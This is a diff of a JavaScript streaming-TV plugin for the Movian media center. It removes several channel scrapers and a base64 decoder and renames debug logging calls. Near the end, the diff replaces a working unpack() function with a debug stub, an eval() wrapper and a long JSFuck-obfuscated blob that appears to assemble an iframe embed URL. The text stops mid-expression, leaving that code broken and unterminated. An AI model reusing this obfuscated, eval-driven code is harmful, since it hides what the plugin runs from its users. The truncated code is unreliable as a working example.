@@ -1,7 +1,7 @@
 /*
  *  Online TV plugin for Movian Media Center
  *
- *  Copyright (C) 2015-2017 lprot
+ *  Copyright (C) 2015-2018 lprot
  *
  *  This program is free software: you can redistribute it and/or modify
  *  it under the terms of the GNU General Public License as published by
@@ -32,10 +32,6 @@
 
     var blue = '6699CC', orange = 'FFA500', red = 'EE0000', green = '008B45';
 
-    function colorStr(str, color) {
-        return '<font color="' + color + '"> (' + str + ')</font>';
-    }
-
     function coloredStr(str, color) {
         return '<font color="' + color + '">' + str + '</font>';
     }
@@ -45,56 +41,15 @@
         return '';
     }
 
-    function base64_decode(data) { // http://kevin.vanzonneveld.net
-        var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
-        var o1, o2, o3, h1, h2, h3, h4, bits, i = 0, ac = 0, dec = "", tmp_arr = [];
-        if (!data)
-            return data;
-        data += '';
-        do { // unpack four hexets into three octets using index points in b64
-            h1 = b64.indexOf(data.charAt(i++));
-            h2 = b64.indexOf(data.charAt(i++));
-            h3 = b64.indexOf(data.charAt(i++));
-            h4 = b64.indexOf(data.charAt(i++));
-            bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;
-            o1 = bits >> 16 & 0xff;
-            o2 = bits >> 8 & 0xff;
-            o3 = bits & 0xff;
-            if (h3 == 64)
-                tmp_arr[ac++] = String.fromCharCode(o1);
-            else if (h4 == 64)
-                    tmp_arr[ac++] = String.fromCharCode(o1, o2);
-                 else
-                    tmp_arr[ac++] = String.fromCharCode(o1, o2, o3);
-        } while (i < data.length);
-        dec = tmp_arr.join('');
-        return dec;
-    }
-
-    function unhash(hash) {
-        var hash1 = "2YdkpV7mUNLB8vzMWwI5Z40uc=";
-        var hash2 = "lnxg6eGyXbQ3sJD9Rafo1iHTtq";
-        for (var i = 0; i < hash1.length; i++) {
-            hash = hash.split(hash1[i]).join('--');
-            hash = hash.split(hash2[i]).join(hash1[i]);
-            hash = hash.split('--').join(hash2[i]);
-        }
-        return base64_decode(hash);
-    }
-
     var service = plugin.createService(plugin.getDescriptor().title, PREFIX + ":start", "tv", true, logo);
 
     var settings = plugin.createSettings(plugin.getDescriptor().title, logo, plugin.getDescriptor().title);
     settings.createBool('debug', 'Enable debug logging',  false, function(v) {
         service.debug = v;
     });
-    settings.createBool('dontShowAdult', "Don't show adult channels", false, function(v) {
-        service.dontShowAdult = v;
-    });
     settings.createBool('disableSampleList', "Don't show Sample M3U list", false, function(v) {
         service.disableSampleList = v;
     });
-
     settings.createBool('disableSampleXMLList', "Don't show Sample XML list", false, function(v) {
         service.disableSampleXMLList = v;
     });
@@ -154,85 +109,6 @@
         } catch(err) {
             page.metadata.title = unescape(title);
             page.error("Sorry, can't get channel's link :(");
-        }
-        page.loading = false;
-    });
-
-    function roughSizeOfObject(object) {
-        var objectList = [];
-        var recurse = function(value) {
-            var bytes = 0;
-            if (typeof value === 'boolean')
-                bytes = 4;
-            else if (typeof value === 'string')
-                bytes = value.length * 2;
-            else if (typeof value === 'number')
-                bytes = 8;
-            else if (typeof value === 'object' && objectList.indexOf(value) === -1) {
-                objectList[ objectList.length ] = value;
-                for (i in value) {
-                    bytes += 8; // assumed existence overhead
-                    bytes += recurse(value[i])
-                }
-            }
-            return bytes;
-        }
-        return recurse(object);
-    }
-
-    var divanHeadersAreSet = false;
-    function setDivanHeaders() {
-        if (!divanHeadersAreSet) {
-            plugin.addHTTPAuth('.*divan\\.tv', function(req) {
-                req.setHeader('User-Agent', UA);
-            });
-            plugin.addHTTPAuth('.*divan\\.tv.*', function(req) {
-                req.setHeader('User-Agent', UA);
-            });
-            divanHeadersAreSet = true;
-        }
-    }
-
-    plugin.addURI(PREFIX + ":divan:(.*):(.*)", function(page, url, title) {
-        page.loading = true;
-        setDivanHeaders();
-        var referer = unescape(url).match(/http/) ? unescape(url) : 'http://divan.tv' + unescape(url);
-        var resp = showtime.httpReq(referer).toString();
-        var match = resp.match(/file: "([\S\s]*?)"/);
-        if (!match) match = resp.match(/stream: "([\S\s]*?)"/);
-	if (!match) match = resp.match(/live_link = '([\S\s]*?)'/);
-        if (match) {
-            var host = match[1].replace('http://','').replace('https://','').split(/[/?#]/)[0];
-            plugin.addHTTPAuth('.*' + host.replace(/\./g, '\\.') + '.*', function(req) {
-	        req.setHeader('Host', host);
-                req.setHeader('Origin', 'http://divan.tv');
-                req.setHeader('Referer', referer);
-                req.setHeader('User-Agent', UA);
-            });
-
-            var n = 0;
-            while (n < 5)
-                try {
-                    showtime.print('Requesting: ' + match[1]);
-                    showtime.httpReq(match[1])
-                    break;
-                } catch(err) {
-                    showtime.print('Retry #' + (n + 1));
-                    showtime.sleep(1);
-                    n++;
-                }
-            page.type = "video";
-            page.source = "videoparams:" + showtime.JSONEncode({
-                title: unescape(title),
-                canonicalUrl: PREFIX + ':divan:' + url + ':' + title,
-                sources: [{
-                    url: 'hls:' + match[1]
-                }],
-                no_subtitle_scan: true
-            });
-        } else {
-            page.metadata.title = unescape(title);
-            page.error("Sorry, can't get the link :(");
         }
         page.loading = false;
     });
@@ -297,51 +173,20 @@
         });
     });
 
-    plugin.addURI(PREFIX + ":seetv:(.*):(.*)", function(page, url, title) {
-        page.metadata.title = unescape(title);
-        page.loading = true;
-        var resp = showtime.httpReq("http://seetv.tv/see/" + unescape(url)).toString();
-        page.loading = false;
-        var match = resp.match(/"link",([\S\s]*?)\)/);
-        if (match) {
-            page.loading = true;
-            doc = showtime.JSONDecode(showtime.httpReq('http://seetv.tv/get/player/' + match[1], {
-                headers: {
-                    Referer: 'http://seetv.tv/see/' + unescape(url),
-                    'X-Requested-With': 'XMLHttpRequest'
-                }
-            }));
-            page.loading = false;
-
-            if (doc && doc.file) {
-                page.type = "video";
-                page.source = "videoparams:" + showtime.JSONEncode({
-                    title: unescape(title),
-                    canonicalUrl: PREFIX + ':seetv:' + url + ':' + title,
-                    sources: [{
-                        url: 'hls:' + unescape(doc.file)
-                    }],
-                    no_subtitle_scan: true
-                });
-            } else
-                page.error("Sorry, can't get the link :(");
-        } else
-            page.error("Sorry, can't get the link :(");
-    });
-
     plugin.addURI(PREFIX + ":file:(.*):(.*)", function(page, url, title) {
         page.loading = true;
         page.metadata.title = unescape(title);
         var resp = showtime.httpReq('http://' + unescape(url)).toString();
-        page.loading = false;
         var match = resp.match(/'file': "([\S\s]*?)"/);
 	if (!match) match = resp.match(/file: "([\S\s]*?)"/);
 	if (!match) match = resp.match(/file": "([\s\S]*?)"/);
         if (!match) match = resp.match(/hlsURL = '([\S\s]*?)'/); // ntv
         if (!match) match = resp.match(/url: '([\S\s]*?)'/); // trk ukraine
         if (!match) match = resp.match(/source: '([\S\s]*?)'/); // donbass tv
+        if (!match) match = resp.match(/source: "([\S\s]*?)"/); // europa tv
 	if (!match) match = resp.match(/src: '([\S\s]*?)'/); // fashion tv
 	if (!match) match = resp.match(/liveurl = "([\s\S]*?)"/); // zvezda
+        page.loading = false;
         if (match) {
             page.type = "video";
 	    match = match[1].replace(/\\\//g, '/');
@@ -398,25 +243,6 @@
                 no_subtitle_scan: true
             });
         } else page.error("Sorry, can't get the link :(");
-    });
-
-    plugin.addURI(PREFIX + ":gamax:(.*):(.*)", function(page, url, title) {
-        page.loading = true;
-        page.metadata.title = unescape(title);
-        var resp = showtime.httpReq(unescape(url)).toString();
-        page.loading = false;
-        var match = resp.match(/'file': '([\S\s]*?)' \}/);
-            if (match) {
-                page.type = "video";
-                page.source = "videoparams:" + showtime.JSONEncode({
-                    title: unescape(title),
-                    canonicalUrl: PREFIX + ':gamax:' + url + ':' + title,
-                    sources: [{
-                        url: match[1].match(/m3u8/) ? 'hls:' + match[1] : match[1]
-                    }],
-                    no_subtitle_scan: true
-                });
-            } else page.error("Sorry, can't get the link :(");
     });
 
     plugin.addURI(PREFIX + ":euronews:(.*):(.*)", function(page, country, title) {
@@ -476,7 +302,6 @@
         page.type = 'video'
         page.source = link;
     });
-
 
     function fill_fav(page) {
 	var list = eval(store.list);
@@ -569,83 +394,6 @@
             menus = re.exec(doc);
             page.appendItem("", "separator");
         }
-    });
-
-    plugin.addURI(PREFIX + ":divanStart", function(page) {
-        setPageHeader(page, 'Divan.tv');
-        page.loading = true;
-        var international = false;
-        setDivanHeaders();
-
-        var doc = showtime.httpReq('https://divan.tv/tv/?devices=online&access=free').toString();
-        if (doc.match(/land-change-site/) || international) {
-            international = true;
-            doc = showtime.httpReq('https://divan.tv/int/tv/?devices=online&access=free').toString();
-        }
-
-        // 1-url, 2-icon, 3-title
-        var re = /class="tv-channel[\S\s]*?<a href="([\S\s]*?)"[\S\s]*?src="([\S\s]*?)"[\S\s]*?<a title="([\S\s]*?)"/g;
-        var n = 0;
-
-        function appendItems() {
-            var match = re.exec(doc);
-            while (match) {
-                var item = page.appendItem(PREFIX + ":divan:" + escape(match[1]) + ':' + escape(match[3]), "video", {
-                    title: match[3],
-                    icon: match[2]
-                });
-                addToFavoritesOption(item, PREFIX + ":divan:" + escape(match[1]) + ':' + escape(match[3]), match[3], match[2]);
-                match = re.exec(doc);
-                n++;
-            }
-        }
-
-        appendItems();
-        var nextPageUrl = 'http://divan.tv/tv/getNextPage';
-        if (international)
-            nextPageUrl = 'https://divan.tv/int/tv/getNextPage';
-        doc = showtime.httpReq(nextPageUrl, {
-            postdata: {
-                filters: '{"page":2}'
-            }
-        }).toString();
-        appendItems();
-
-        doc = showtime.httpReq(nextPageUrl, {
-            postdata: {
-                filters: '{"page":3}'
-            }
-        }).toString();
-        appendItems();
-
-        page.metadata.title = 'Divan.tv (' + n + ')';
-        page.options.createAction('loginToDivan', 'Login to divan.tv', function() {
-            page.loading = false;
-            var credentials = plugin.getAuthCredentials(PREFIX, 'Enter email and password to login', true, 'divan');
-            if (credentials.rejected) {
-                page.error('Cannot continue without login/password :(');
-                return false;
-            }
-            if (credentials && credentials.username && credentials.password) {
-                page.loading = true;
-                var resp = showtime.httpReq('http://divan.tv/users/login', {
-                    headers: {
-                        Origin: 'http://divan.tv',
-                        Referer: 'http://divan.tv/',
-                        'X-Requested-With': 'XMLHttpRequest'
-                    },
-                    postdata: {
-                        'data[Form][login]': credentials.username,
-                        'data[Form][password]': credentials.password,
-                        'data[Form][remember]': 1,
-                        '': 'ВОЙТИ'
-                    }
-                });
-                page.flush();
-                page.redirect(PREFIX + ':divanStart');
-            }
-        });
-        page.loading = false;
     });
 
     function showPlaylist(page) {
@@ -880,9 +628,9 @@
         setPageHeader(page, unescape(title));
         page.loading = true;
         var n = 1;
-        showtime.print('Parser is: ' + unescape(parser));
+        log('Parser is: ' + unescape(parser));
         var params = unescape(parser).split('|');
-        showtime.print('Requesting: ' + params[0]);
+        log('Requesting: ' + params[0]);
         if (!params[0]) {
             page.error('The link is empty');
             return;
@@ -893,13 +641,13 @@
             var start = html.indexOf(params[1]) + params[1].length;
             var length = html.indexOf(params[2], start) - start;
             var url = html.substr(start, length).split(',');
-            showtime.print('Found URL: ' + url);
+            log('Found URL: ' + url);
             //var urlCheck = params[1].replace(/\\\//g, '/') + url + params[2].replace(/\\\//g, '/');
             //if (urlCheck.match(/(http.*)/))
             //    url = urlCheck.match(/(http.*)/)[1];
             if (!url[0].trim()) {
                 url = html.match(/pl:"([\s\S]*?)"/)[1];
-                showtime.print('Fetching URL from pl: ' + url);
+                log('Fetching URL from pl: ' + url);
                 var json = showtime.JSONDecode(showtime.httpReq(url));
             } else if (url[0].trim().substr(0, 4) != 'http') {
                 if (url[0][0] == '/') {
@@ -910,9 +658,9 @@
                     url = url[0].match(/value="([\s\S]*?)"/);
                     if (url) {
                         url = url[1];
-                        showtime.print('Fetching URL from value: ' + url);
+                        log('Fetching URL from value: ' + url);
                         var json = showtime.JSONDecode(showtime.httpReq(url));
-                        showtime.print(showtime.JSONEncode(json));
+                        log(showtime.JSONEncode(json));
                         for (var i in json.playlist) {
                             if (json.playlist[i].file) {
                                 page.appendItem(json.playlist[i].file.split(' ')[0], 'video', {
@@ -920,21 +668,21 @@
                                 });
                             }
                             for (var j in json.playlist[i].playlist) {
-                                //showtime.print(json.playlist[i].playlist[j].comment);
+                                //log(json.playlist[i].playlist[j].comment);
                                 page.appendItem(json.playlist[i].playlist[j].file.split(' ')[0], 'video', {
                                     title: new showtime.RichText(json.playlist[i].comment + ' - ' + json.playlist[i].playlist[j].comment)
                                 });
                             }
                         }
                     } else {
-                        showtime.print('Fetching URL from file":": ' + url);
+                        log('Fetching URL from file":": ' + url);
                         var file = html.match(/file":"([\s\S]*?)"/);
                         if (file) {
                             page.appendItem(file[1].replace(/\\\//g, '/'), 'video', {
                                 title: new showtime.RichText(unescape(title))
                             });
                         } else {
-                            showtime.print('Fetching URL from pl":": ' + url);
+                            log('Fetching URL from pl":": ' + url);
                             var pl = html.match(/pl":"([\s\S]*?)"/)[1].replace(/\\\//g, '/');
                             var json = showtime.JSONDecode(showtime.httpReq(pl).toString().trim());
                             for (var i in json.playlist) {
@@ -944,7 +692,7 @@
                                     });
                                 }
                                 for (var j in json.playlist[i].playlist) {
-                                    //showtime.print(json.playlist[i].playlist[j].comment);
+                                    //log(json.playlist[i].playlist[j].comment);
                                     page.appendItem(json.playlist[i].playlist[j].file.split(' ')[0], 'video', {
                                         title: new showtime.RichText(json.playlist[i].comment + ' - ' + json.playlist[i].playlist[j].comment)
                                     });
@@ -997,10 +745,8 @@
         return description;
     }
 
-    var adults = ['O-la-la', 'XXL', 'Русская ночь', 'Blue Hustler', 'Brazzers TV Europe', 'Playboy TV'];
-
     plugin.addURI('xml:(.*):(.*)', function(page, pl, pageTitle) {
-        showtime.print('Main list: ' + decodeURIComponent(pl).trim());
+        log('Main list: ' + decodeURIComponent(pl).trim());
         setPageHeader(page, unescape(pageTitle));
         page.loading = true;
         try {
@@ -1024,8 +770,7 @@
         for (var i = 0; i < channels.length; i++) {
             //if (channels[i].category_id && channels[i].category_id != 1) continue;
             var title = showtime.entityDecode(channels[i].title);
-            if (service.dontShowAdult && adults.indexOf(title) != -1) continue;
-            //showtime.print(title);
+            //log(title);
             title = setColors(title);
             var playlist = channels[i].playlist_url;
             var description = channels[i].description ? channels[i].description : null;
@@ -1165,7 +910,7 @@
                     re2 = new RegExp(tmp[3] + '>([\\s\\S]*?)<\/span>');
                     tmp2 = re2.exec(doc);
                     lnk += tmp2[1];
-                showtime.print(lnk);
+                log(lnk);
 
                 }
                 match = re.exec(doc);
@@ -1373,40 +1118,20 @@
         page.loading = false;
     });
 
-    function unpack(str) {
-        function get_chunks(str) {
-            var chunks = str.match(/eval\(\(?function\(.*?(,0,\{\}\)\)|split\('\|'\)\)\))($|\n)/g);
-            return chunks ? chunks : [];
+    function unpack(doc) {
+        var document = this;
+        document.write = function(a) {
+showtime.print('ddddd');
         };
+var LiNLcdbieT = "YkZ5bXE1NmQzSmxZZUtyTm10bGxWYUhhb3A2bVpGcDByOUtackpXSW9xeW0zK2lman;FYcm5hT3RtWVp5M1p5aXJXWmFjckNrenR0cWlIT25uYUNvYWx5bTJhSEsyV2haY0E9PQ__";
+var aZXSPTZMVU = LiNLcdbieT.split(";");
+function RULhTbdULa(aXjNjLQKTV){
+eval(aXjNjLQKTV);
+}
+var _0x3703=['<iframe src="http://www.'+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+!+[]+[!+[]+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]])+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(!![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+'/embed/'+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+'/'+aZXSPTZMVU[1]+'/'+aZXSPTZMVU[0]+'" width="640" height="460" scrolling="no" frameborder="0" allowtransparency="true"></iframe>',"\x77\x72\x69\x74\x65"];_0x3704 = [_0x3703[0].replace("/strea/", (![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]),_0x3703[[+[]]+[]].replace("/stre/", (![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]